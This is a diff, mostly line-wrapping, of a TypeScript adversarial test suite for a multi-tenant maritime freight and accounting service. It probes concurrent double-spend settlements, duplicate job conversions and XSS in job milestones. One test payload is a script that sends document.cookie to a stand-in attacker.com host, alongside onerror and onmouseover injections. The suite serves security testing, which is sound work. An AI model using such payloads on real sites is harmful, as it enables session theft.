@@ -8,8 +8,14 @@ import { MaritimeFreightService } from '../src/modules/maritime-freight/maritime
 import { AuthContext } from '../src/core/auth/interfaces/auth-context.interface';
 import { checkInsuranceClaim } from '../src/modules/maritime-freight/engines/cargo-insurance.engine';
 import { calculateFreightAudit } from '../src/modules/maritime-freight/engines/freight-audit.engine';
-import { calculateAirChargeableWeight, validateIataAwbNumber } from '../src/modules/maritime-freight/engines/air-freight.engine';
-import { calculateTrucksRequired, validateCmrWaybillNumber } from '../src/modules/maritime-freight/engines/road-freight.engine';
+import {
+  calculateAirChargeableWeight,
+  validateIataAwbNumber,
+} from '../src/modules/maritime-freight/engines/air-freight.engine';
+import {
+  calculateTrucksRequired,
+  validateCmrWaybillNumber,
+} from '../src/modules/maritime-freight/engines/road-freight.engine';
 
 // ============================================================================
 // LOGISTICS CHAOS MONKEY & ADVERSARIAL SABOTEUR SUITE
@@ -35,7 +41,12 @@ const results: AttackResult[] = [];
 
 function recordResult(r: AttackResult) {
   results.push(r);
-  const icon = r.verdict === 'BLOCKED' ? '🛡️ [BLOCKED]' : r.verdict === 'EXPLOIT_FOUND' ? '⚠️ [EXPLOIT FOUND]' : '❌ [FATAL CRASH]';
+  const icon =
+    r.verdict === 'BLOCKED'
+      ? '🛡️ [BLOCKED]'
+      : r.verdict === 'EXPLOIT_FOUND'
+        ? '⚠️ [EXPLOIT FOUND]'
+        : '❌ [FATAL CRASH]';
   const color = r.verdict === 'BLOCKED' ? '\x1b[32m' : r.verdict === 'EXPLOIT_FOUND' ? '\x1b[33m' : '\x1b[31m';
   console.log(`  ${color}${icon}\x1b[0m ${r.testId} - ${r.name}`);
   console.log(`     Vector:   ${r.attackVector}`);
@@ -70,7 +81,12 @@ async function runChaosSabotage() {
     sendRawMessage: async () => ({ success: true }),
   };
 
-  const service = new MaritimeFreightService(db, mailMock, waMock, new AccountingPostingService(new AccountingTenantFoundationService()));
+  const service = new MaritimeFreightService(
+    db,
+    mailMock,
+    waMock,
+    new AccountingPostingService(new AccountingTenantFoundationService()),
+  );
 
   // Setup distinct tenants for multi-tenant isolation testing
   const primaryTenantId = 'chaos-logistics-t1';
@@ -104,24 +120,96 @@ async function runChaosSabotage() {
   console.log('\x1b[36m[*] Initializing isolated chaos testing sandbox & test tenants...\x1b[0m');
   for (const tid of [primaryTenantId, attackerTenantId]) {
     // Pre-cleanup leftover data from previous runs if any
-    await db.deleteFrom('maritime_containers').where('tenant_id', '=', tid).execute().catch(() => {});
-    await db.deleteFrom('maritime_warehouse_receipts').where('tenant_id', '=', tid).execute().catch(() => {});
-    await db.deleteFrom('maritime_cargo_insurances').where('tenant_id', '=', tid).execute().catch(() => {});
-    await db.deleteFrom('maritime_job_charges').where('tenant_id', '=', tid).execute().catch(() => {});
-    await db.deleteFrom('maritime_quotations').where('tenant_id', '=', tid).execute().catch(() => {});
-    await db.deleteFrom('maritime_rfq_bids').where('tenant_id', '=', tid).execute().catch(() => {});
-    await db.deleteFrom('maritime_rfqs').where('tenant_id', '=', tid).execute().catch(() => {});
-    await db.deleteFrom('maritime_inquiries').where('tenant_id', '=', tid).execute().catch(() => {});
-    await db.deleteFrom('maritime_jobs').where('tenant_id', '=', tid).execute().catch(() => {});
-    await db.deleteFrom('maritime_rate_cards').where('tenant_id', '=', tid).execute().catch(() => {});
-    await db.deleteFrom('customer_ledger').where('tenant_id', '=', tid).execute().catch(() => {});
-    await db.deleteFrom('customers').where('tenant_id', '=', tid).execute().catch(() => {});
-    await db.deleteFrom('journal_entry_lines').where('tenant_id', '=', tid).execute().catch(() => {});
-    await db.deleteFrom('journal_entries').where('tenant_id', '=', tid).execute().catch(() => {});
-    await db.deleteFrom('cost_centers').where('tenant_id', '=', tid).execute().catch(() => {});
-    await db.deleteFrom('accounting_settings').where('tenant_id', '=', tid).execute().catch(() => {});
-    await db.deleteFrom('currency_exchange_rates').where('tenant_id', '=', tid).execute().catch(() => {});
-    await db.deleteFrom('accounting_accounts').where('tenant_id', '=', tid).execute().catch(() => {});
+    await db
+      .deleteFrom('maritime_containers')
+      .where('tenant_id', '=', tid)
+      .execute()
+      .catch(() => {});
+    await db
+      .deleteFrom('maritime_warehouse_receipts')
+      .where('tenant_id', '=', tid)
+      .execute()
+      .catch(() => {});
+    await db
+      .deleteFrom('maritime_cargo_insurances')
+      .where('tenant_id', '=', tid)
+      .execute()
+      .catch(() => {});
+    await db
+      .deleteFrom('maritime_job_charges')
+      .where('tenant_id', '=', tid)
+      .execute()
+      .catch(() => {});
+    await db
+      .deleteFrom('maritime_quotations')
+      .where('tenant_id', '=', tid)
+      .execute()
+      .catch(() => {});
+    await db
+      .deleteFrom('maritime_rfq_bids')
+      .where('tenant_id', '=', tid)
+      .execute()
+      .catch(() => {});
+    await db
+      .deleteFrom('maritime_rfqs')
+      .where('tenant_id', '=', tid)
+      .execute()
+      .catch(() => {});
+    await db
+      .deleteFrom('maritime_inquiries')
+      .where('tenant_id', '=', tid)
+      .execute()
+      .catch(() => {});
+    await db
+      .deleteFrom('maritime_jobs')
+      .where('tenant_id', '=', tid)
+      .execute()
+      .catch(() => {});
+    await db
+      .deleteFrom('maritime_rate_cards')
+      .where('tenant_id', '=', tid)
+      .execute()
+      .catch(() => {});
+    await db
+      .deleteFrom('customer_ledger')
+      .where('tenant_id', '=', tid)
+      .execute()
+      .catch(() => {});
+    await db
+      .deleteFrom('customers')
+      .where('tenant_id', '=', tid)
+      .execute()
+      .catch(() => {});
+    await db
+      .deleteFrom('journal_entry_lines')
+      .where('tenant_id', '=', tid)
+      .execute()
+      .catch(() => {});
+    await db
+      .deleteFrom('journal_entries')
+      .where('tenant_id', '=', tid)
+      .execute()
+      .catch(() => {});
+    await db
+      .deleteFrom('cost_centers')
+      .where('tenant_id', '=', tid)
+      .execute()
+      .catch(() => {});
+    await db
+      .deleteFrom('accounting_settings')
+      .where('tenant_id', '=', tid)
+      .execute()
+      .catch(() => {});
+    await db
+      .deleteFrom('currency_exchange_rates')
+      .where('tenant_id', '=', tid)
+      .execute()
+      .catch(() => {});
+    await db
+      .deleteFrom('accounting_accounts')
+      .where('tenant_id', '=', tid)
+      .execute()
+      .catch(() => {});
 
     await db
       .insertInto('tenants')
@@ -146,12 +234,48 @@ async function runChaosSabotage() {
   // Ensure accounts for financial journals in accounting_accounts
   for (const tid of [primaryTenantId, attackerTenantId]) {
     const accs = [
-      { code: '1130', name_ar: 'العملاء - حسابات مدينة', name_en: 'Accounts Receivable', type: 'asset', group: 'current_assets' },
-      { code: '1170', name_ar: 'أمانات وتأمينات الحاويات لدى الخطوط الملاحية', name_en: 'Container Deposits Held', type: 'asset', group: 'current_assets' },
-      { code: '4200', name_ar: 'إيرادات خدمات الشحن واللوجستيات', name_en: 'Logistics Revenue', type: 'revenue', group: 'operating_revenue' },
-      { code: '6400', name_ar: 'تكلفة خدمات الشحن والنقل', name_en: 'Freight Operating Cost', type: 'expense', group: 'operating_expenses' },
-      { code: '2110', name_ar: 'موردون وخطوط ملاحية - حسابات دائنة', name_en: 'Accounts Payable', type: 'liability', group: 'current_liabilities' },
-      { code: '1110', name_ar: 'الخزينة النقدية الرئيسية', name_en: 'Cash on Hand', type: 'asset', group: 'current_assets' },
+      {
+        code: '1130',
+        name_ar: 'العملاء - حسابات مدينة',
+        name_en: 'Accounts Receivable',
+        type: 'asset',
+        group: 'current_assets',
+      },
+      {
+        code: '1170',
+        name_ar: 'أمانات وتأمينات الحاويات لدى الخطوط الملاحية',
+        name_en: 'Container Deposits Held',
+        type: 'asset',
+        group: 'current_assets',
+      },
+      {
+        code: '4200',
+        name_ar: 'إيرادات خدمات الشحن واللوجستيات',
+        name_en: 'Logistics Revenue',
+        type: 'revenue',
+        group: 'operating_revenue',
+      },
+      {
+        code: '6400',
+        name_ar: 'تكلفة خدمات الشحن والنقل',
+        name_en: 'Freight Operating Cost',
+        type: 'expense',
+        group: 'operating_expenses',
+      },
+      {
+        code: '2110',
+        name_ar: 'موردون وخطوط ملاحية - حسابات دائنة',
+        name_en: 'Accounts Payable',
+        type: 'liability',
+        group: 'current_liabilities',
+      },
+      {
+        code: '1110',
+        name_ar: 'الخزينة النقدية الرئيسية',
+        name_en: 'Cash on Hand',
+        type: 'asset',
+        group: 'current_assets',
+      },
     ];
     for (const a of accs) {
       await db
@@ -388,7 +512,9 @@ async function runChaosSabotage() {
 
     // Attack 2.1: The Double-Spend Concurrency Hammer (MTR-CONCURRENCY-5X)
     // Customer has 150,000 credit. Fire 5 concurrent settlements of 100,000 each (Total = 500,000)!
-    console.log('  [*] Launching 5 concurrent settlement attacks on customer credit (Total 500,000 against 150,000 credit)...');
+    console.log(
+      '  [*] Launching 5 concurrent settlement attacks on customer credit (Total 500,000 against 150,000 credit)...',
+    );
     const hammerResults = await Promise.allSettled([
       service.settleJobFromCustomerBalance(authT1, String(legitJobT1.id), { amount: 100000 }),
       service.settleJobFromCustomerBalance(authT1, String(legitJobT1.id), { amount: 100000 }),
@@ -1079,7 +1205,9 @@ async function runChaosSabotage() {
     });
 
     // Attack 8.1: 5 Rapid Concurrent autoConvertQuotationToJob calls
-    console.log('  [*] Launching 5 concurrent job conversion requests on quotation #' + testQuotation.quotation_number + '...');
+    console.log(
+      '  [*] Launching 5 concurrent job conversion requests on quotation #' + testQuotation.quotation_number + '...',
+    );
     await Promise.allSettled([
       service.autoConvertQuotationToJob(authT1, String(testQuotation.id)),
       service.autoConvertQuotationToJob(authT1, String(testQuotation.id)),
@@ -1292,9 +1420,16 @@ async function runChaosSabotage() {
     }
 
     // Attack 11.2: XSS Injection in Job Milestones
-    const xssPayload = '<script>fetch("http://attacker.com/steal?c=" + document.cookie)</script><img src=x onerror=alert(1)>';
+    const xssPayload =
+      '<script>fetch("http://attacker.com/steal?c=" + document.cookie)</script><img src=x onerror=alert(1)>';
     try {
-      await service.addJobMilestone(authT1, String(legitJobT1.id), 'DISC', xssPayload, '<b onmouseover=evil()>Alexandria</b>');
+      await service.addJobMilestone(
+        authT1,
+        String(legitJobT1.id),
+        'DISC',
+        xssPayload,
+        '<b onmouseover=evil()>Alexandria</b>',
+      );
       recordResult({
         campaign: 'CAMPAIGN 11',
         testId: 'ATTACK-11.2',
@@ -1377,32 +1512,110 @@ async function runChaosSabotage() {
         actualOutcome: `Non-compliant format: ${jobNum}`,
       });
     }
-
   } catch (uncaughtCampaignErr: any) {
-    console.error('\n❌ Uncaught error during campaign execution:', uncaughtCampaignErr?.message || uncaughtCampaignErr);
+    console.error(
+      '\n❌ Uncaught error during campaign execution:',
+      uncaughtCampaignErr?.message || uncaughtCampaignErr,
+    );
   } finally {
     // Teardown & cleanup test artifacts
     console.log('\n\x1b[36m[*] Cleaning up isolated chaos test records from database...\x1b[0m');
     for (const tid of [primaryTenantId, attackerTenantId]) {
-      await db.deleteFrom('maritime_containers').where('tenant_id', '=', tid).execute().catch(() => {});
-      await db.deleteFrom('maritime_warehouse_receipts').where('tenant_id', '=', tid).execute().catch(() => {});
-      await db.deleteFrom('maritime_cargo_insurances').where('tenant_id', '=', tid).execute().catch(() => {});
-      await db.deleteFrom('maritime_job_charges').where('tenant_id', '=', tid).execute().catch(() => {});
-      await db.deleteFrom('maritime_quotations').where('tenant_id', '=', tid).execute().catch(() => {});
-      await db.deleteFrom('maritime_rfq_bids').where('tenant_id', '=', tid).execute().catch(() => {});
-      await db.deleteFrom('maritime_rfqs').where('tenant_id', '=', tid).execute().catch(() => {});
-      await db.deleteFrom('maritime_inquiries').where('tenant_id', '=', tid).execute().catch(() => {});
-      await db.deleteFrom('maritime_jobs').where('tenant_id', '=', tid).execute().catch(() => {});
-      await db.deleteFrom('maritime_rate_cards').where('tenant_id', '=', tid).execute().catch(() => {});
-      await db.deleteFrom('customer_ledger').where('tenant_id', '=', tid).execute().catch(() => {});
-      await db.deleteFrom('customers').where('tenant_id', '=', tid).execute().catch(() => {});
-      await db.deleteFrom('journal_entry_lines').where('tenant_id', '=', tid).execute().catch(() => {});
-      await db.deleteFrom('journal_entries').where('tenant_id', '=', tid).execute().catch(() => {});
-      await db.deleteFrom('cost_centers').where('tenant_id', '=', tid).execute().catch(() => {});
-      await db.deleteFrom('accounting_settings').where('tenant_id', '=', tid).execute().catch(() => {});
-      await db.deleteFrom('currency_exchange_rates').where('tenant_id', '=', tid).execute().catch(() => {});
-      await db.deleteFrom('accounting_accounts').where('tenant_id', '=', tid).execute().catch(() => {});
-      await db.deleteFrom('tenants').where('id', '=', tid).execute().catch(() => {});
+      await db
+        .deleteFrom('maritime_containers')
+        .where('tenant_id', '=', tid)
+        .execute()
+        .catch(() => {});
+      await db
+        .deleteFrom('maritime_warehouse_receipts')
+        .where('tenant_id', '=', tid)
+        .execute()
+        .catch(() => {});
+      await db
+        .deleteFrom('maritime_cargo_insurances')
+        .where('tenant_id', '=', tid)
+        .execute()
+        .catch(() => {});
+      await db
+        .deleteFrom('maritime_job_charges')
+        .where('tenant_id', '=', tid)
+        .execute()
+        .catch(() => {});
+      await db
+        .deleteFrom('maritime_quotations')
+        .where('tenant_id', '=', tid)
+        .execute()
+        .catch(() => {});
+      await db
+        .deleteFrom('maritime_rfq_bids')
+        .where('tenant_id', '=', tid)
+        .execute()
+        .catch(() => {});
+      await db
+        .deleteFrom('maritime_rfqs')
+        .where('tenant_id', '=', tid)
+        .execute()
+        .catch(() => {});
+      await db
+        .deleteFrom('maritime_inquiries')
+        .where('tenant_id', '=', tid)
+        .execute()
+        .catch(() => {});
+      await db
+        .deleteFrom('maritime_jobs')
+        .where('tenant_id', '=', tid)
+        .execute()
+        .catch(() => {});
+      await db
+        .deleteFrom('maritime_rate_cards')
+        .where('tenant_id', '=', tid)
+        .execute()
+        .catch(() => {});
+      await db
+        .deleteFrom('customer_ledger')
+        .where('tenant_id', '=', tid)
+        .execute()
+        .catch(() => {});
+      await db
+        .deleteFrom('customers')
+        .where('tenant_id', '=', tid)
+        .execute()
+        .catch(() => {});
+      await db
+        .deleteFrom('journal_entry_lines')
+        .where('tenant_id', '=', tid)
+        .execute()
+        .catch(() => {});
+      await db
+        .deleteFrom('journal_entries')
+        .where('tenant_id', '=', tid)
+        .execute()
+        .catch(() => {});
+      await db
+        .deleteFrom('cost_centers')
+        .where('tenant_id', '=', tid)
+        .execute()
+        .catch(() => {});
+      await db
+        .deleteFrom('accounting_settings')
+        .where('tenant_id', '=', tid)
+        .execute()
+        .catch(() => {});
+      await db
+        .deleteFrom('currency_exchange_rates')
+        .where('tenant_id', '=', tid)
+        .execute()
+        .catch(() => {});
+      await db
+        .deleteFrom('accounting_accounts')
+        .where('tenant_id', '=', tid)
+        .execute()
+        .catch(() => {});
+      await db
+        .deleteFrom('tenants')
+        .where('id', '=', tid)
+        .execute()
+        .catch(() => {});
     }
     await pool.end().catch(() => {});
   }
